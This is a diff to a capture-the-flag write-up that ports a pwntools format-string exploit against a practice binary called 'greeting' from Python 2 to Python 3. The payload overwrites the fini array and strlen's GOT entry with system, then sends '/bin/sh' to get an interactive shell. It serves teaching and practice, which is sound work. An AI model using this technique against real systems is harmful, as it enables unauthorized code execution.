@@ -311,10 +311,10 @@ getline = 0x8048614
 systemPlt = 0x8048490
 
 # Establish the format string
-payload = ""
+payload = b""
 
 # Just a bit of padding
-payload += "xx"
+payload += b"xx"
 
 # Address of fini array
 payload += p32(finiArray)
@@ -329,27 +329,27 @@ payload += p32(strlenGot)
 payload += p32(strlenGot + 2)
 
 # Write the lower two bytes of the fini array with loop around address (getline setup)
-payload += "%34288x"
-payload += "%12$n"
+payload += b"%34288x"
+payload += b"%12$n"
 
 # Write the lower two bytes of the plt system address to the got strlen entry
-payload += "%65148x"
-payload += "%14$n"
+payload += b"%65148x"
+payload += b"%14$n"
 
 # Write the higher two bytes of the two address we just wrote to
 # Both are the same (0x804)
-payload += "%33652x"
-payload += "%13$n"
-payload += "%15$n"
+payload += b"%33652x"
+payload += b"%13$n"
+payload += b"%15$n"
 
 # Print the length of our fmt string (make sure we meet the size requirement)
-print "len: " + str(len(payload))
+print("len: " + str(len(payload)))
 
 # Send the format string
 target.sendline(payload)
 
 # Send '/bin/sh' to trigger the system('/bin/sh') call
-target.sendline('/bin/sh')
+target.sendline(b'/bin/sh')
 
 # Drop to an interactive shell
 target.interactive()
@@ -358,7 +358,7 @@ target.interactive()
 With that exploit, we get shell!
 
 ```
-$   ython3 exploit.py 
+$   python3 exploit.py 
 [!] Could not find executable 'greeting' in $PATH, using './greeting' instead
 [+] Starting local process './greeting': pid 60336
 [*] running in new terminal: ['/usr/bin/gdb', '-q', './greeting', '60336', '-x', '/tmp/pwnmn_pac9x.gdb']
